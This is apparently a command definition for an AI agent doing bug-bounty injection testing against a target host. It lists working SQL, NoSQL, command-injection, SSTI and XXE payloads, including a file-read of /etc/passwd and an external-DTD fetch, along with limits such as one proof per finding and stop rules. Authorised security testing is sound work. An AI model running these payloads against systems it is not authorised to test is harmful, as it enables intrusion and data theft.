---
description: Hunt injection — SQL, NoSQL, command, SSTI, XXE, deserialization — detection first, one proof.
argument-hint: <host or endpoint> [param]
allowed-tools: Bash, Read, Write, WebFetch
---

# /bbw-injection

`references/07`, `workflows/07`, `checklists/injection.md`.

**Input:** `$ARGUMENTS` — host or endpoint, optional parameter.

```
/bbw-injection https://app.acme.com
/bbw-injection "GET /api/search?q="
```

A 500 is not a finding. A returned row, a command output, a rendered `49` is.

---

## Step 1 — Rank the inputs

1. Numeric ids in paths (`/orders/1042`)
2. Sort and filter params (`?sort=`, `?filter[price]=`, `?order_by=`)
3. Search (`?q=`)
4. JSON string fields
5. GraphQL arguments
6. Date ranges on reports and exports
7. Params the frontend dropped but the backend still reads (`data/parameters.txt`)

## Step 2 — SQL detection

```
value        → 200 normal
value'       → 500 or visible change
value''      → 200 normal again      ← the signal
```

If that holds, confirm with a boolean pair, three tries each:

```
' AND 1=1--      → normal
' AND 1=2--      → different
```

Then time, three tries, and check the delay scales:

```
' AND SLEEP(3)--                          MySQL
'; WAITFOR DELAY '0:0:3'--                MSSQL
' AND 1=(SELECT 1 FROM PG_SLEEP(3))--     Postgres
' AND 1=dbms_pipe.receive_message(('a'),3)-- Oracle
```

## Step 3 — One extraction, then stop

```
' UNION SELECT version(),user(),database()-- -
' UNION SELECT table_name FROM information_schema.tables LIMIT 1-- -
```

One response containing a version string or a table name is the proof. Do not
dump tables and do not enumerate schemas beyond that.

## Step 4 — NoSQL

```json
{"email":{"$ne":null},"password":{"$ne":null}}
{"email":{"$regex":"^admin"},"password":{"$ne":null}}
```

Query string: `?email[$ne]=x`. Array: `username[]=admin&username[]=x`.
A login bypass here is Critical.

## Step 5 — Command, SSTI, XXE

**Command** — anywhere a filename, URL or parameter reaches a shell:

```
; id    | id    $(id)    `id`    && id    %0aid
```

**SSTI** — fields rendered into emails, PDFs, invoices:

```
{{7*7}}   ${7*7}   #{7*7}   <%= 7*7 %>   {{7*'7'}}
```

`49` (or `7777777`) confirms evaluation; then escalate to a file read with the
engine's gadget, one request.

**XXE** — any XML/SOAP/SAML/SVG/DOCX upload:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

```xml
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://<oast>/e.dtd"> %p;]>
```

Blind XXE via the listener is still a finding — capture the hit.

## Step 6 — Deserialization (only if you see the shape)

Magic bytes and formats: `rO0AB` (Java), `O:8:` (PHP), `!!python/object`
(PyYAML), `AAEAAAD` (.NET). If found, note it and use a safe detection payload
(a URL fetch to your listener), never a full gadget chain on production.

## Step 7 — Record

```
POST /api/search            q=x' UNION SELECT version(),user(),database()-- -
→ 200  ["8.0.32","app@db","shop"]
```

That line, plus the raw response, is the finding.

---

## Output shape

```
inputs tested: N   injectable: N
class: sql | nosql | command | ssti | xxe
proof: <the exact payload and the extracted value>
severity: <band>
next: /bbw-score then /bbw-report
```

## Stop conditions

- Quotes reflect unchanged and no delay appears → "closed", move on.
- A delay that does not scale with the number → noise, not a finding.
- Extraction beyond one row → stop; you have what you need.
- sqlmap only with `--level=2 --risk=1 --technique=T` and only if the rules allow
  automated tooling.
